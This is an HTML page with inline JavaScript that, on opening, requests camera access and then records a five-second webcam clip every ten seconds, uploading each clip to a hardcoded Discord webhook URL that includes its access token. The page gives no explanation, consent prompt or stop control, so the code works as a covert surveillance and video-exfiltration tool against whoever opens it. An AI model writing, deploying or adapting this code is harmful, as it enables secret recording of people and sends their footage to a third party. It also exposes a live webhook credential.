<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Video Capture & Send to Discord</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
    </style>
</head>
<body>
    <h1>mmm Auto Video Capture & Send to Discord</h1>
    <video id="video" width="640" height="480" autoplay></video>

    <script>
        const video = document.getElementById('video');
        let mediaRecorder;
        let recordedChunks = [];

        // Function to send video to Discord
        function sendVideoToDiscord(videoBlob) {
            const formData = new FormData();
            formData.append('file', videoBlob, 'captured_video.webm');

            // Sending the video to Discord via Webhook
            fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
                method: 'POST',
                body: formData,
            })
            .then(response => {
                if (response.ok) {
                    console.log('Successfully sent video to Discord');
                } else {
                    console.error('Error sending video to Discord:', response.statusText);
                }
            })
            .catch((error) => {
                console.error('Error sending video to Discord:', error);
            });
        }

        // Function to capture video for 5 seconds
        function captureVideo() {
            recordedChunks = [];
            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000); // Record for 5 seconds
        }

        // Start the camera and initiate video recording
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;

                // Initialize MediaRecorder to capture video
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

                // Capture video data when available
                mediaRecorder.ondataavailable = function (event) {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                // When the recording stops, send the video
                mediaRecorder.onstop = function () {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    sendVideoToDiscord(videoBlob);
                };

                // Start recording every 10 seconds
                setInterval(captureVideo, 10000); // Record every 10 seconds
            })
            .catch((error) => {
                console.error("Error accessing the camera", error);
            });
    </script>
</body>
</html>